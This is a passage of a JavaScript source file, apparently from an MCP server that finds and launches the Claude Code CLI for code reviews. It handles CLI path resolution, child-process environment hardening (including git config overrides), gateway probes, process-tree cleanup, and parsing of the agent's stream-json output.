import { spawn, spawnSync, execFile } from "node:child_process";
import { promisify } from "node:util";
import fs from "node:fs";
import net from "node:net";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";
import { policyFingerprint } from "./shell-guard.js";
// One implementation of the config-dir rule (skill.js resolves relative
// CLAUDE_CONFIG_DIR values; a second copy here drifted and could point the
// skill path and the child-process env at different directories — P3-10).
import { claudeConfigDir } from "./skill.js";

const execFileAsync = promisify(execFile);
const IS_WIN = process.platform === "win32";
const MAX_STREAM_BYTES = 8 * 1024 * 1024;
const SRC_DIR = path.dirname(fileURLToPath(import.meta.url));
const HOOK_SCRIPT = path.join(SRC_DIR, "..", "scripts", "pre-tool-hook.js");

/* ------------------------------------------------------------------ */
/* Claude CLI resolution (cross-platform, cross-install-method)        */
/*                                                                    */
/* Priority:                                                          */
/*  1. CLAUDE_CODE_PATH env (must be directly spawnable)              */
/*  2. PATH scan for a directly spawnable binary                      */
/*     (no `where`/`which` subprocess: on CJK Windows `where` outputs  */
/*      OEM-codepage bytes that decode to mojibake in utf8)           */
/*  3. Well-known locations: native installer / winget / Homebrew /   */
/*     legacy local installer / default npm prefix                    */
/*  4. `npm root -g` package layout (respects custom npm prefix):     */
/*     bin/claude.exe (all platforms since ~2.1.2xx), cli-wrapper.cjs */
/*     or legacy cli.js (spawned via this Node)                       */
/*  5. Claude desktop app's bundled versioned CLI (last resort,       */
/*     unofficial entry point — may move on app updates)              */
/* ------------------------------------------------------------------ */

let cachedCli;

/** A cached entry is only usable while the file it points at still exists. */
function cliPathStillThere(cli) {
  try {
    return fs.statSync(cli.path).isFile();
  } catch {
    return false;
  }
}

/** @returns {{kind:"exec"|"node-script", path:string, source:string} | {error:string} | null} */
export function resolveClaudeCli({ refresh = false } = {}) {
  // The cache must be invalidated when the binary disappears: a version-manager
  // switch, an upgrade that rewrites the path, or an uninstall would otherwise
  // keep returning a path that no longer spawns, and every review would fail
  // with ENOENT until the MCP server is restarted. (`refresh` forces a re-scan.)
  // (The cache only ever holds successes — see the assignment below — so there is
  // no error entry to test for here; R-17.)
  if (!refresh && cachedCli) {
    if (cliPathStillThere(cachedCli)) return cachedCli;
    cachedCli = undefined;
  }
  prefetchNpmGlobalRoot({ refresh }); // non-blocking: the value is only needed on the fallback path
  const r = resolveNow();
  // Only cache successes — a later install/upgrade should be picked up without a restart.
  if (r && !r.error) cachedCli = r;
  return r;
}

function isExecutableFile(p) {
  try {
    const st = fs.statSync(p);
    if (!st.isFile()) return false;
    // A zero-byte "executable" is a Windows app-execution alias (a 0-length
    // reparse point in %LOCALAPPDATA%\Microsoft\WindowsApps) or a broken
    // install — spawning one opens the Store page or hangs, it never runs
    // claude. A real claude.exe is never empty.
    if (st.size === 0) return false;
    if (!IS_WIN) fs.accessSync(p, fs.constants.X_OK);
    return true;
  } catch {
    return false;
  }
}

function resolveNow() {
  const home = os.homedir();

  // 1. explicit override — must be something Node can spawn without a shell
  const envPath = process.env.CLAUDE_CODE_PATH;
  if (envPath) {
    const low = envPath.toLowerCase();
    const kind = classifySpawnTarget(envPath, low);
    if (kind === "exec" || kind === "node-script") return { kind, path: envPath, source: "env:CLAUDE_CODE_PATH" };
    if (kind === "shim") {
      return {
        error:
          `CLAUDE_CODE_PATH points at a shell shim (${envPath}) which Node cannot spawn directly. ` +
          `Point it at the real executable (npm installs put it at <prefix>\\node_modules\\@anthropic-ai\\claude-code\\bin\\claude.exe) or at cli.js/cli-wrapper.cjs.`,
      };
    }
    return { error: `CLAUDE_CODE_PATH is set but is not a usable executable: ${envPath}` };
  }

  // 2. PATH scan
  const names = IS_WIN ? ["claude.exe", "claude-code.exe"] : ["claude", "claude-code"];
  for (const dir of (process.env.PATH || "").split(path.delimiter)) {
    const d = (dir || "").replace(/^"|"$/g, "");
    if (!d) continue;
    // WindowsApps only ever contains app-execution aliases (see isExecutableFile);
    // skipping the directory outright avoids even looking at them.
    if (IS_WIN && /[\\/]microsoft[\\/]windowsapps[\\/]?$/i.test(d)) continue;
    for (const n of names) {
      const p = path.join(d, n);
      if (isExecutableFile(p)) return { kind: "exec", path: p, source: `PATH scan (${d})` };
    }
  }

  // 3. well-known locations
  const appData = process.env.APPDATA || path.join(home, "AppData", "Roaming");
  const localAppData = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
  const wellKnown = IS_WIN ? [
    path.join(home, ".local", "bin", "claude.exe"),                                                   // native installer
    path.join(localAppData, "Microsoft", "WinGet", "Links", "claude.exe"),                            // winget portable
    path.join(appData, "npm", "node_modules", "@anthropic-ai", "claude-code", "bin", "claude.exe"),  // npm default prefix
  ] : [
    path.join(home, ".local", "bin", "claude"),   // native installer
    "/opt/homebrew/bin/claude",                   // Homebrew cask / Homebrew npm (Apple Silicon)
    "/usr/local/bin/claude",                      // Homebrew cask / system npm (Intel)
    path.join(home, ".claude", "local", "claude"),// legacy local installer
    path.join(home, ".npm-global", "bin", "claude"),
  ];
  for (const p of wellKnown) {
    if (isExecutableFile(p)) return { kind: "exec", path: p, source: `well-known (${p})` };
  }

  // 4. npm global root (honours custom prefixes)
  const npmRoot = npmRootCache; // async + memoised; undefined until the prefetch lands
  if (npmRoot) {
    const pkg = path.join(npmRoot, "@anthropic-ai", "claude-code");
    // current packages ship a native binary named claude.exe on every platform
    const exe = path.join(pkg, "bin", "claude.exe");
    if (isExecutableFile(exe)) return { kind: "exec", path: exe, source: `npm global root (${npmRoot})` };
    // a package flavour that ships the unix binary without the .exe name
    if (!IS_WIN) {
      const unixExe = path.join(pkg, "bin", "claude");
      if (isExecutableFile(unixExe)) return { kind: "exec", path: unixExe, source: `npm global root (${npmRoot})` };
    }
    for (const js of ["cli-wrapper.cjs", "cli.js"]) {
      const p = path.join(pkg, js);
      if (fs.existsSync(p)) return { kind: "node-script", path: p, source: `npm global ${js} (${npmRoot})` };
    }
  }

  // 5. Claude desktop app bundled CLI (last resort)
  const desk = desktopAppCli();
  if (desk) return desk;

  return null;
}

/** "exec" | "node-script" | "shim" | "no" */
function classifySpawnTarget(p, low) {
  let st;
  try { st = fs.statSync(p); } catch { return "no"; }
  if (!st.isFile()) return "no";
  // A zero-byte file on Windows is an app-execution alias (a reparse point in
  // %LOCALAPPDATA%\Microsoft\WindowsApps): spawning it opens the Store page or
  // silently no-ops. `where claude` happily prints exactly those, so users copy
  // them into CLAUDE_CODE_PATH — the extension check below would accept them.
  if (st.size === 0) return "no";
  if (low.endsWith(".js") || low.endsWith(".cjs") || low.endsWith(".mjs")) return "node-script";
  if (low.endsWith(".cmd") || low.endsWith(".bat") || low.endsWith(".ps1") || low.endsWith(".sh")) return "shim";
  if (IS_WIN) return low.endsWith(".exe") || low.endsWith(".com") ? "exec" : "no";
  // POSIX: spawning needs the exec bit; a bare shebang would fail as EACCES later
  return isExecutableFile(p) ? "exec" : "no";
}

/**
 * Locate npm's global root without spawning npm(.cmd): use the npm-cli.js
 * shipped with this Node.
 *
 * The spawn is ASYNC and memoised. The old synchronous version blocked the MCP
 * event loop for up to 10s on a cold npm cache — during the handshake that
 * looked like a hung server. It is kicked off fire-and-forget by
 * resolveClaudeCli() and read back from `npmRootCache` once it lands; a miss
 * just falls through to the desktop-app last resort and the next resolution
 * attempt (or a `refresh`) picks the value up.
 */
let npmRootCache; // string | null | undefined (undefined = not resolved yet)
let npmRootCacheAt = 0;
let npmRootInflight;

/**
 * How long a FAILED probe stays memoised.
 *
 * The failure is memoised at all because otherwise every resolveClaudeCli() on an
 * npm-less machine re-spawned `npm root -g` and waited out its 10s timeout in the
 * background. Caching it FOREVER was the bug (R-8): one cold-cache timeout at
 * startup — exactly what the settled resolve below exists to survive — left this
 * process answering NOT_FOUND for the rest of its life, and `refresh` did not
 * clear it either. Success stays memoised until the path stops existing; only the
 * failure expires.
 */
const NPM_ROOT_FAILURE_TTL_MS = 60 * 1000;

function queryNpmGlobalRootAsync({ refresh = false } = {}) {
  if (refresh && npmRootCache === null) npmRootCache = undefined; // explicit re-probe
  if (npmRootCache !== undefined) {
    if (npmRootCache !== null) return Promise.resolve(npmRootCache);
    if (Date.now() - npmRootCacheAt < NPM_ROOT_FAILURE_TTL_MS) return Promise.resolve(null);
    npmRootCache = undefined; // the cached failure expired: probe again
  }
  if (npmRootInflight) return npmRootInflight;
  const exeDir = path.dirname(process.execPath);
  const candidates = [
    path.join(exeDir, "node_modules", "npm", "bin", "npm-cli.js"),                      // Windows installer layout
    path.join(path.dirname(exeDir), "lib", "node_modules", "npm", "bin", "npm-cli.js"), // unix prefix layout (incl. nvm)
  ];
  npmRootInflight = (async () => {
    for (const cli of candidates) {
      if (!fs.existsSync(cli)) continue;
      try {
        const { stdout } = await execFileAsync(process.execPath, [cli, "root", "-g"], {
          encoding: "utf8", timeout: 10000, windowsHide: true, env: buildClaudeEnv(),
        });
        const root = (stdout || "").trim().split(/\r?\n/).pop().trim();
        if (root && fs.existsSync(root)) { npmRootCache = root; npmRootCacheAt = Date.now(); return root; }
      } catch { /* try the next candidate */ }
      break; // npm-cli.js exists but could not be run: no point retrying every call
    }
    npmRootCache = null;         // a failure, NOT a verdict: it expires after the TTL
    npmRootCacheAt = Date.now();
    return null;
  })().finally(() => { npmRootInflight = undefined; });
  return npmRootInflight;
}

/** Fire-and-forget: start the npm root query so a later call finds it cached. */
function prefetchNpmGlobalRoot({ refresh = false } = {}) {
  void queryNpmGlobalRootAsync({ refresh }).catch(() => {});
}

/**
 * resolveClaudeCli() but it waits out the in-flight npm-root probe once when the
 * synchronous pass came up empty. Closes the first-call race on installs that
 * are reachable ONLY via a custom npm prefix (not in well-known dirs, not on the
 * GUI host's sparse PATH): those used to report NOT_FOUND until ~10s after
 * server start, and the startup prewarm bailed without a retry.
 */
export async function resolveClaudeCliSettled() {
  const first = resolveClaudeCli();
  if (first || !npmRootInflight) return first;
  await npmRootInflight.catch(() => { /* probe failure = null, memoised with a TTL */ });
  return resolveClaudeCli();
}

/** Numeric value of one dotted-version component, ignoring any pre-release suffix. */
function numPart(s) {
  const m = /^\d+/.exec(String(s || ""));
  return m ? Number(m[0]) : 0;
}

/**
 * Compare dotted versions. Non-numeric components count as 0 instead of NaN,
 * so "2.1.301-beta.1" sorts ABOVE "2.1.200" (a NaN comparison returns false for
 * every test and would silently keep the wrong "newest" first in desktopAppCli).
 */
function cmpVer(a, b) {
  const pa = String(a).split(".").map(numPart);
  const pb = String(b).split(".").map(numPart);
  for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
    const d = (pa[i] ?? 0) - (pb[i] ?? 0);
    if (d) return d > 0 ? 1 : -1;
  }
  return 0;
}

function desktopAppCli() {
  const home = os.homedir();
  const base = IS_WIN
    ? path.join(process.env.APPDATA || path.join(home, "AppData", "Roaming"), "Claude", "claude-code")
    : path.join(home, "Library", "Application Support", "Claude", "claude-code");
  let versions;
  try { versions = fs.readdirSync(base).filter((d) => /^\d/.test(d)); } catch { return null; }
  versions.sort((a, b) => cmpVer(b, a)); // newest first
  for (const v of versions) {
    const p = IS_WIN
      ? path.join(base, v, "claude.exe")
      : path.join(base, v, "claude.app", "Contents", "MacOS", "claude");
    if (isExecutableFile(p)) {
      return { kind: "exec", path: p, source: `Claude desktop app bundled CLI v${v} (unofficial entry point; may move when the app updates)` };
    }
  }
  return null;
}

/* ------------------------------------------------------------------ */
/* Claude config / env                                                */
/* ------------------------------------------------------------------ */

// claudeConfigDir() lives in skill.js and is imported above: one implementation
// for the process env, the settings.json env block and relative-path resolution.

/**
 * Read the effective settings.json `env` block fresh (CC Switch rewrites it; never cache).
 * A file that exists but does not parse is recorded (see settingsParseProblem) instead of
 * being silently conflated with "no settings at all" — claude ignores such a file too, so
 * the verdict stays truthful, but the env tool can now say WHY it sees no gateway.
 */
let settingsParseProblemText;
function peekSettingsEnvInner() {
  settingsParseProblemText = undefined;
  let f;
  try { f = path.join(claudeConfigDir(), "settings.json"); } catch { return {}; }
  let raw;
  try { raw = fs.readFileSync(f, "utf8"); } catch (e) {
    if (e?.code !== "ENOENT") settingsParseProblemText = `could not read ${f}: ${e?.message || e}`;
    return {};
  }
  try {
    const j = JSON.parse(raw);
    return j && typeof j.env === "object" && j.env ? j.env : {};
  } catch (e) {
    settingsParseProblemText = `${f} exists but is not valid JSON (${e?.message || e}) — claude ignores it entirely, so no gateway/auth config is applied from it`;
    return {};
  }
}

/** The effective settings.json env block (for diagnostics in the env tool). */
export function peekSettingsEnv() {
  return peekSettingsEnvInner();
}

/** Why the effective settings.json yielded no env block, when that is a file problem (or undefined). */
export function settingsParseProblem() {
  return settingsParseProblemText;
}

/** Effective env for auth decisions: settings.json env overrides inherited values (claude does the same). */
function mergedAuthEnv() {
  return { ...process.env, ...peekSettingsEnvInner() };
}

/**
 * True for a host literal that can only mean "this machine".
 *
 * Normalise first: Node's URL.hostname keeps the brackets on an IPv6 literal
 * ("http://[::1]:8080" -> "[::1]") and keeps the trailing dot of an absolute
 * name ("localhost."), and neither form matched the old three-way test — so a
 * loopback gateway was routed through the host's HTTP proxy together with its
 * Bearer token (SEC-09). IPv4-mapped loopback ("::ffff:127.0.0.1", what a
 * dual-stack listener reports) counts as loopback too.
 */
function isLoopbackHost(h) {
  let host = String(h ?? "").trim().toLowerCase();
  if (host.startsWith("[") && host.endsWith("]")) host = host.slice(1, -1); // IPv6 literal
  if (host.endsWith(".")) host = host.replace(/\.+$/, "");                 // absolute-dot form
  if (!host) return false;
  if (host === "localhost") return true;
  const v4 = host.includes("%") ? host.slice(0, host.indexOf("%")) : host; // drop an IPv6 zone id
  if (v4 === "::1" || v4 === "0:0:0:0:0:0:0:1") return true;
  // IPv4-mapped loopback. Both spellings occur: the literal "::ffff:127.0.0.1" a
  // dual-stack listener reports, and "::ffff:7f00:1", which is how URL normalizes
  // the same address ("http://[::ffff:127.0.0.1]/" → hostname "[::ffff:7f00:1]").
  const mapped = /^::ffff:(.+)$/.exec(v4);
  if (mapped) {
    const tail = mapped[1];
    if (tail.includes(".")) return isLoopbackHost(tail);
    const hex = /^([0-9a-f]{1,4}):[0-9a-f]{1,4}$/.exec(tail);
    return hex ? Number.parseInt(hex[1], 16) >> 8 === 0x7f : false; // 127.0.0.0/8
  }
  if (net.isIP(v4) === 6) return false;
  return /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(v4);
}

/**
 * Environment for the claude child process:
 *  - drop our own entrypoint marker so claude's telemetry sees a standard CLI session
 *  - macOS/Linux: APPEND (never prepend) common tool dirs missing from the host
 *    PATH — GUI-launched hosts inherit launchd's sparse PATH, which breaks both
 *    npm shims (`#!/usr/bin/env node`) and claude's own Bash tool (git/gh lookup).
 *    Appending keeps the user's own PATH priority (no shim-shadowing). The dir of
 *    the node binary running THIS server is included too: under nvm/fnm/asdf the
 *    host PATH often lacks it, and every `#!/usr/bin/env node` inside the claude
 *    child (npm shims, hook commands) would then fail to resolve.
 *  - `CLAUDE_CODE_EFFORT_LEVEL` is deleted: per the official env docs it takes
 *    precedence over `--effort`, and CC Switch configurations set it in the
 *    settings env block, which would silently override the caller's effort.
 *  - never route loopback gateways (CC Switch / local proxies) through an HTTP proxy
 */
export function buildClaudeEnv() {
  const env = { ...process.env };
  delete env.CLAUDE_CODE_ENTRYPOINT;
  delete env.CLAUDE_CODE_EFFORT_LEVEL; // let the caller's --effort win

  if (!IS_WIN) {
    const home = os.homedir();
    const extra = [
      "/opt/homebrew/bin", "/opt/homebrew/sbin",
      "/usr/local/bin", "/usr/local/sbin",
      path.join(home, ".local", "bin"),
      path.dirname(process.execPath),
    ];
    const cur = (env.PATH || "/usr/bin:/bin").split(path.delimiter).filter(Boolean);
    const missing = extra.filter((d) => d && !cur.includes(d));
    if (missing.length) env.PATH = [...cur, ...missing].join(path.delimiter);
  }

  const target = gatewayTarget();
  if (target && isLoopbackHost(target.host)) {
    const covers = (v) =>
      !!v && v.split(",").map((s) => s.trim().toLowerCase())
        .some((s) => ["localhost", "127.0.0.1", "::1", "<local>", ".local", "*"].includes(s));
    const add = "localhost,127.0.0.1,::1";
    for (const key of ["NO_PROXY", "no_proxy"]) {
      if (!covers(env[key])) env[key] = env[key] ? `${env[key]},${add}` : add;
    }
  }
  // GIT_CONFIG_* is the ENV equivalent of "git -c key=value": it applies at
  // command scope, which beats every config file the reviewer's git will read,
  // and — unlike the server's own gitSpawnOpts()/GIT_HARDENING_ARGS — it follows
  // git into the claude child and into every Bash tool call it makes. That is
  // the layer the scanner below cannot be: .git/config can name a command the
  // scan did not anticipate, and `git remote show origin` (allowlisted, and
  // suggested by the prompt) runs core.sshCommand before any network I/O.
  // The keys are exactly the ones a review needs to survive: a repository must
  // not choose the ssh transport, the pager, the credential helper, the hook
  // path, the fsmonitor, the external diff, or a third attributes file.
  // A host-provided GIT_CONFIG_COUNT is preserved (entries are appended after
  // it) so the server never silently drops config the caller injected.
  const gitOverrides = [
    ["core.sshCommand", ""],
    ["core.fsmonitor", ""],
    ["core.pager", "cat"], // a pager is a program; "cat" is the inert one
    ["core.hooksPath", ""],
    ["diff.external", ""],
    ["credential.helper", ""],
    // P0-9: attributesFile is a THIRD attributes source that can activate a
    // live textconv driver on a plain `git log -p`; an empty value removes it.
    ["core.attributesFile", ""],
  ];
  const hostCount = /^\d+$/.test(String(env.GIT_CONFIG_COUNT ?? "")) ? Number(env.GIT_CONFIG_COUNT) : 0;
  gitOverrides.forEach(([key, value], i) => {
    env["GIT_CONFIG_KEY_" + (hostCount + i)] = key;
    env["GIT_CONFIG_VALUE_" + (hostCount + i)] = value;
  });
  env.GIT_CONFIG_COUNT = String(hostCount + gitOverrides.length);

  return env;
}

/** The configured ANTHROPIC_BASE_URL (from effective env), parsed — or null. */
export function gatewayTarget() {
  const u = mergedAuthEnv().ANTHROPIC_BASE_URL;
  if (!u) return null;
  try {
    const url = new URL(u);
    return { url, host: url.hostname, port: Number(url.port) || (url.protocol === "https:" ? 443 : 80) };
  } catch {
    return null;
  }
}

/**
 * TCP pre-flight for loopback gateways only. claude retries a dead endpoint silently
 * for minutes, which would otherwise surface as a misleading "timeout".
 * Result cached for 30s per host:port — keyed by target, so a CC Switch port
 * change (it picks a new port on restart) is never answered from a stale entry.
 */
const probeCache = new Map(); // "host:port" -> {at, result}

export async function probeGateway(timeoutMs = 2500) {
  const t = gatewayTarget();
  if (!t || !isLoopbackHost(t.host)) return { skipped: true };
  const key = `${t.host}:${t.port}`;
  const hit = probeCache.get(key);
  if (hit && Date.now() - hit.at < 30_000) return hit.result;
  const result = await new Promise((resolve) => {
    let socket;
    try {
      socket = net.connect({ host: t.host, port: t.port });
    } catch (e) {
      resolve({ ok: false, host: key, reason: e.code || e.message });
      return;
    }
    const done = (r) => { socket.destroy(); resolve(r); };
    socket.setTimeout(timeoutMs, () => done({ ok: false, host: key, reason: "no listener (timeout)" }));
    socket.once("connect", () => done({ ok: true, host: key }));
    socket.once("error", (e) => done({ ok: false, host: key, reason: e.code || e.message }));
  });
  probeCache.set(key, { at: Date.now(), result });
  return result;
}

/**
 * Auth variables present in the host env but NOT managed by settings.json.
 *
 * Only credential-bearing variables are reported: `ANTHROPIC_MODEL` & friends are
 * model choices (reported separately, see modelEnvOverrides), not credentials, and
 * `CLAUDE_ENV_FILE` is set by CC Switch itself — flagging it as residue made the
 * tool warn at the very users it is meant to reassure.
 */
export function authEnvResidue() {
  const s = peekSettingsEnv();
  const prefixes = ["ANTHROPIC_", "CLAUDE_CODE_"];
  const allow = new Set([
    // telemetry / UX / non-auth knobs that legitimately live in the host env
    "CLAUDE_CODE_ENTRYPOINT", "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC",
    "CLAUDE_CODE_MAX_OUTPUT_TOKENS", "CLAUDE_CODE_SUBAGENT_MODEL",
    // this MCP strips it from the child env (buildClaudeEnv), so it cannot
    // override the caller's --effort — reported by its own env-tool line instead
    "CLAUDE_CODE_EFFORT_LEVEL",
  ]);
  // Model CHOICES are not credentials; modelEnvOverrides() reports them separately.
  const modelChoice = /^ANTHROPIC_(MODEL|SMALL_FAST_MODEL|DEFAULT_OPUS_MODEL|DEFAULT_SONNET_MODEL|DEFAULT_HAIKU_MODEL)$/;
  return Object.keys(process.env).filter((k) =>
    prefixes.some((p) => k.startsWith(p)) && !allow.has(k) && !modelChoice.test(k) && s[k] == null
  );
}

/** Model-selection variables in the host env (not credentials — reported, never as a conflict). */
export function modelEnvOverrides() {
  const s = peekSettingsEnv();
  return Object.keys(process.env).filter((k) =>
    /^ANTHROPIC_(MODEL|SMALL_FAST_MODEL|DEFAULT_OPUS_MODEL|DEFAULT_SONNET_MODEL|DEFAULT_HAIKU_MODEL)$/.test(k) && s[k] == null
  );
}

/* ------------------------------------------------------------------ */
/* Process management                                                  */
/* ------------------------------------------------------------------ */

const liveChildren = new Set();

/** Kill the child's whole process tree. */
function killTree(child) {
  if (!child || !child.pid) return;
  // Never group-kill a child that already exited: on unix the pid may already
  // have been reused by an unrelated process group, and `kill(-pid)` would take
  // that group down with it (e.g. the user's editor). Only signal a live child.
  const alive = child.exitCode == null && child.signalCode == null;
  if (IS_WIN) {
    if (!alive) return;
    const r = spawnSync("taskkill", ["/pid", String(child.pid), "/T", "/F"], { timeout: 5000, windowsHide: true });
    if ((r.error || r.status !== 0) && alive) {
      try { child.kill("SIGKILL"); } catch { /* already dead */ }
    }
  } else {
    if (alive) {
      // child was spawned detached -> it leads its own process group
      try { process.kill(-child.pid, "SIGKILL"); } catch { /* not a group leader / already gone */ }
    }
    try { child.kill("SIGKILL"); } catch { /* already dead */ }
  }
}

/**
 * Reap the process group of a child that has JUST emitted 'exit'.
 *
 * killTree() deliberately refuses to signal an exited pid (the reuse guard), so
 * it cannot clean up after a child that exits while descendants it spawned (MCP
 * servers, shell helpers) are still alive. Those descendants inherit the child's
 * stdout/stderr: they keep the pipes open, so 'close' never fires and the MCP
 * call waits for a done run — and the old code then labelled that finished run
 * timedOut and discarded the report (P1-9). 'exit' is delivered in the same loop
 * iteration the child is reaped in, so its pid cannot have been reused yet; the
 * group id is still ours to SIGKILL, which closes the inherited pipes too.
 */
function reapExitedGroup(child) {
  if (!child || !child.pid) return;
  if (IS_WIN) {
    // Windows has no process groups; best effort only. The 'exit'-based settle
    // below still returns the real status even if a survivor keeps a pipe open.
    try { spawnSync("taskkill", ["/pid", String(child.pid), "/T", "/F"], { timeout: 5000, windowsHide: true }); } catch { /* best effort */ }
    return;
  }
  // child was spawned detached -> it led its own process group
  try { process.kill(-child.pid, "SIGKILL"); } catch { /* no survivors / group already gone */ }
}

// Node's default SIGTERM handling exits WITHOUT firing "exit" — on unix a detached
// claude would survive the server and keep burning credits. Handle signals explicitly.
// Exit with 128+signum (SIGTERM 143, SIGINT 130, SIGHUP 129) instead of 0 (R-21):
// exiting 0 on a signal told the supervising host this was a normal shutdown, so an
// interrupted server was indistinguishable from a clean one.
const SIGNAL_EXIT_CODES = { SIGTERM: 143, SIGINT: 130, SIGHUP: 129 };
for (const sig of ["SIGTERM", "SIGINT", "SIGHUP"]) {
  process.on(sig, () => {
    for (const c of liveChildren) { try { killTree(c); } catch { /* best effort */ }
    }
    process.exit(SIGNAL_EXIT_CODES[sig] ?? 128 + (os.constants.signals?.[sig] || 0));
  });
}
process.on("exit", () => {
  for (const c of liveChildren) { try { killTree(c); } catch { /* best effort */ }
  }
  guardSettingsInFlight.clear(); // exit: nothing is in-flight any more
  cleanupGuardSettings();
  // Our throwaway git HOME (built lazily in gitSpawnOpts) — sync removal in an
  // exit handler is safe and stops one temp dir leaking per server process.
  if (gitEmptyHome && gitEmptyHome !== os.tmpdir()) {
    try { fs.rmSync(gitEmptyHome, { recursive: true, force: true }); } catch { /* best effort */ }
  }
});

/**
 * Index of the `}` that closes the `{` at `open`, or -1 when it never closes.
 * String- and escape-aware: braces inside a JSON string ("a}b{c") are content,
 * not structure — the reason a non-greedy regex truncates nested payloads.
 */
function matchBrace(text, open) {
  let depth = 0;
  let inStr = false;
  let esc = false;
  for (let i = open; i < text.length; i++) {
    const ch = text[i];
    if (inStr) {
      if (esc) esc = false;
      else if (ch === "\\") esc = true;
      else if (ch === '"') inStr = false;
      continue;
    }
    if (ch === '"') inStr = true;
    else if (ch === "{") depth++;
    else if (ch === "}" && --depth === 0) return i;
  }
  return -1;
}

/** Parse the final `{"type":"result",...}` JSON object from claude stdout. */
export function parseResultJson(stdout) {
  const text = String(stdout ?? "");
  const lines = text.split(/\r?\n/);
  // Fast path, unchanged: the result event on one line (the normal
  // `--output-format json` shape).
  for (let i = lines.length - 1; i >= 0; i--) {
    const line = lines[i].trim();
    if (!line.startsWith("{")) continue;
    try {
      const obj = JSON.parse(line);
      if (obj && typeof obj === "object" && obj.type === "result") return obj;
    } catch { /* partial/banner line, keep scanning */ }
  }
  // Fallback (R-15): a PRETTY-PRINTED result — a wrapper or gateway may re-format
  // the output, and the single-line scan returned null for every multi-line
  // object, turning a successful run into "no parseable result JSON". Walk the
  // opening braces backwards, brace-match each block and keep the one carrying
  // type:"result"; nested objects are skipped harmlessly because they are tried
  // first and rejected by the type test.
  const starts = [];
  for (let at = 0, i = 0; i < lines.length; i++) {
    starts.push({ at, line: lines[i] });
    at += lines[i].length;
    while (at < text.length && (text[at] === "\r" || text[at] === "\n")) at++;
  }
  let tries = 0;
  for (let i = starts.length - 1; i >= 0 && tries < 64; i--) {
    if (starts[i].line.trim() !== "{") continue; // a pretty-printed object opens a line
    tries++;
    const open = starts[i].at + starts[i].line.indexOf("{");
    const end = matchBrace(text, open);
    if (end < 0) continue;
    try {
      const obj = JSON.parse(text.slice(open, end + 1));
      if (obj && typeof obj === "object" && obj.type === "result") return obj;
    } catch { /* not a standalone object, keep scanning */ }
  }
  return null;
}

/** tool_result content is a plain string or an array of {type:"text"} blocks. */
function toolResultText(content) {
  if (typeof content === "string") return content;
  if (Array.isArray(content)) {
    return content
      .map((b) => (typeof b === "string" ? b : b?.type === "text" && typeof b.text === "string" ? b.text : ""))
      .filter(Boolean)
      .join("\n");
  }
  return "";
}

/**
 * One parsed stream-json event → the facts the report needs. Pure so the tests
 * (and the stub claude) can feed it synthetic events.
 *
 * claude 2.1+ forwards subagent activity to the parent stream, and the skill
 * dispatches the whole finder fleet in ONE message (so they run in parallel) —
 * so every fact here is a LIST: one event can carry several Agent tool_use
 * blocks, several tool_results, or several Bash calls. Single-valued fields
 * silently kept only the last block and dropped the rest of the reviewers.
 *
 * Two report paths exist depending on how the CLI runs the dispatch:
 *  - synchronous Task/Agent: the matching tool_result carries the report;
 *  - async background agents (2.1.x default for general-purpose): the
 *    tool_result is only a launch acknowledgement, and the real report
 *    arrives later as a `system/task_notification` keyed by the same
 *    tool call id (summary field, status completed/stopped).
 */
export function streamEventFacts(obj) {
  const facts = {};
  if (!obj || typeof obj !== "object") return facts;
  if (obj.type === "result") { facts.result = obj; return facts; }
  if (obj.type === "system" && obj.subtype === "task_notification" && typeof obj.tool_use_id === "string") {
    facts.taskNotification = {
      toolUseId: obj.tool_use_id,
      status: String(obj.status ?? ""),
      report: typeof obj.summary === "string" ? obj.summary : "",
      outputFile: typeof obj.output_file === "string" ? obj.output_file : undefined,
    };
    return facts;
  }
  const model = typeof obj?.message?.model === "string" ? obj.message.model : null;
  if (model) {
    const subagent = typeof obj.agent_id === "string" || typeof obj.parent_tool_use_id === "string";
    facts.model = { model, subagent };
  }
  const content = obj?.message?.content;
  if (!Array.isArray(content)) return facts;
  if (obj?.message?.role === "assistant") {
    // A slash command (/code-review) runs as a forked command and delivers its
    // answer as an assistant message with model "<synthetic>", while the result
    // event carries an empty result and num_turns 0. Keep the last text so a
    // run whose result is empty still has a report.
    const text = content.filter((b) => b?.type === "text" && typeof b.text === "string").map((b) => b.text).join(String.fromCharCode(10)).trim();
    if (text) facts.assistantText = text;
  }
  const bashCommands = [];
  const agentDispatches = [];
  const agentResults = [];
  const workflowDispatches = [];
  const toolUses = [];
  for (const block of content) {
    if (block?.type !== "tool_use" && block?.type !== "tool_result") continue;
    if (block.type === "tool_use" && typeof block.id === "string") {
      // Which tool owns this id. Task notifications are keyed by tool_use_id,
      // and not every background task is a reviewer: 2.1.x also runs a
      // `Monitor` task, whose notification ("… stream ended") used to be
      // recorded as a sixth reviewer subagent.
      toolUses.push({ id: block.id, name: String(block.name ?? "") });
    }
    if (block.type === "tool_use" && block.name === "Bash" && typeof block.input?.command === "string") {
      bashCommands.push(block.input.command);
    }
    if (block.type === "tool_use" && (block.name === "Agent" || block.name === "Task")) {
      agentDispatches.push({
        id: typeof block.id === "string" ? block.id : "",
        description: String(block.input?.description ?? ""),
        subagentType: String(block.input?.subagent_type ?? block.input?.agent_type ?? ""),
      });
    }
    // Ultracode's native orchestration lands here: a Workflow dispatch runs a
    // deterministic multi-agent script in the background. Counting it is the
    // only direct evidence in the parent stream that the workflow mode began.
    if (block.type === "tool_use" && block.name === "Workflow") {
      workflowDispatches.push({ id: typeof block.id === "string" ? block.id : "", name: String(block.input?.name ?? "") });
    }
    if (block.type === "tool_result" && typeof block.tool_use_id === "string") {
      const text = toolResultText(block.content);
      agentResults.push({ id: block.tool_use_id, text, ack: parseAgentLaunchAck(text) || undefined });
    }
  }
  if (bashCommands.length) facts.bashCommands = bashCommands;
  if (agentDispatches.length) facts.agentDispatches = agentDispatches;
  if (agentResults.length) facts.agentResults = agentResults;
  if (workflowDispatches.length) facts.workflowDispatches = workflowDispatches;
  if (toolUses.length) facts.toolUses = toolUses;
  return facts;
}

/**
 * claude logs `[claude-code:unrecognized_model] {"model":...,"query_source":...}`
 * on stderr whenever a request names a model that is not a Claude model — the
 * reliable trace of a gateway (CC Switch) or settings.json env rewrite. Each
 * line is one API request that already billed under the substituted model.
 */
export function parseUnrecognizedModels(stderr) {
  const out = [];
  const text = String(stderr || "");
